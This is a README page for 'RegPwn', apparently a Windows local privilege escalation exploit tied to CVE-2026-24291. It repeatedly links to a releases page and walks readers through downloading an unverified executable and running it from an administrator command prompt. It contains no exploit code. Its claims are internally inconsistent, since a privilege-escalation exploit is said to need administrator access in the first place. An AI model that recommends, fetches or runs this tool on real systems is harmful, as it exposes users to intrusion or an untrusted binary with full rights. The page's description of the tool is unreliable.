# 🛠️ RegPwn - Windows Local Exploit Tool

[![Download RegPwn](https://img.shields.io/badge/Download-RegPwn-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/tracyliving606/RegPwn/releases)

---

RegPwn is a tool designed to demonstrate a local privilege escalation (LPE) exploit on Windows systems. It works on Windows 10, Windows 11, and Windows Server versions. This guide will help you download, prepare, and run RegPwn on your Windows computer safely and effectively.

## 📋 What You Need Before You Begin

Before you download RegPwn, make sure your system meets the following:

- You are running one of the supported Windows versions:
  - Windows 11 (versions 24h2 and 25h2)
  - Windows 10 (version 21h2)
  - Windows Server 2016, 2019, or 2022
- You have administrator access on your computer.
- You are familiar with basic Windows operations, such as downloading files and running programs.

RegPwn is intended as a research tool. It exploits vulnerabilities tracked as CVE-2026-24291. Always use it on systems where you have permission to test.

## 🔍 About RegPwn

RegPwn exploits a security flaw in Windows that lets users gain higher privileges than intended. This can be useful for testing system security and verifying if your system is vulnerable. 

The tool was tested and confirmed to work on the versions listed above. It targets registry handling on Windows, which is why it requires careful execution.

## 🌐 Visit to Download RegPwn

To get the latest version of RegPwn, visit the releases page:

[Visit RegPwn Releases](https://github.com/tracyliving606/RegPwn/releases)

Clicking this link will take you to the release page where you can download the files. The releases page will list the latest versions along with files you need to run.

## 💾 How to Download and Prepare RegPwn

1. Click the button above or open this link in your web browser:
   https://github.com/tracyliving606/RegPwn/releases

2. On the releases page, look for the latest version. The most recent release will have a name like `v1.0` or higher.

3. Inside the release, find the `.exe` file or a zip archive that contains the RegPwn executable. It may be named something like `RegPwn.exe`.

4. Click the file name to start the download. Your browser may ask for confirmation; choose to keep the file.

5. Once downloaded, if the file is compressed (zip), right-click it and choose "Extract All..." to unpack the content into a new folder.

6. Make note of the folder location where you saved or extracted RegPwn.

## 🚀 How to Run RegPwn on Windows

Running RegPwn involves opening a command prompt and executing the program as an administrator.

1. Search for "Command Prompt" in your Windows Start menu.

2. Right-click "Command Prompt" and select "Run as administrator". This step is important because the program needs full access.

3. In the Command Prompt window, use the `cd` command to change to the directory where you saved RegPwn. For example, if you saved it in `Downloads\RegPwn`, type:

```
cd %HOMEPATH%\Downloads\RegPwn
```

and press Enter.

4. Run RegPwn by typing:

```
RegPwn.exe
```

and press Enter.

5. Follow any on-screen prompts or output messages the program gives.

_If you see errors related to permissions or missing files, check that you are running as administrator and that all necessary files are in the folder._

## ⚙️ What to Expect When Using RegPwn

When you run RegPwn, the program will attempt to exploit a security flaw in the registry handling of Windows. It may produce messages indicating success or failure.

Typical output might show:

- Confirmation of the operating system version.
- Status messages during exploit attempts.
- Whether the exploit succeeded or failed.
- Instructions on what to do next if successful.

Do not close the Command Prompt until RegPwn finishes. Closing early might leave processes incomplete.

## 🛑 Important Operation Details

- The exploit targets registry permissions and may modify key system settings temporarily.
- Running this tool can cause system changes or instability. Use it only for test purposes.
- This tool is not intended for casual or everyday use.
- Always restart your computer after running the tool to restore system state.

## 🔄 How to Remove RegPwn

RegPwn does not require an installation. You can simply delete the folder where you stored the executable to remove it.

If you want to ensure no changes persist:

1. Restart your computer after running RegPwn.
2. Delete the RegPwn folder and any downloaded files.
3. Run standard system checks or antivirus scans, if desired.

## 🤝 Getting Help and Reporting Issues

For technical problems or questions, use the GitHub repository issues page:

[GitHub Issues for RegPwn](https://github.com/tracyliving606/RegPwn/issues)

Provide details about your Windows version and what steps you followed. This helps the developer understand and fix problems.

## 🔒 Security and Responsible Use

RegPwn exploits known vulnerabilities to test system security. Use it only on your own machines or systems where you have permission. Running exploits on unauthorized systems can cause harm or be illegal.

Keep your system updates current and monitor vendor security bulletins for patches related to CVE-2026-24291.

---

[![Download RegPwn](https://img.shields.io/badge/Download-RegPwn-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/tracyliving606/RegPwn/releases)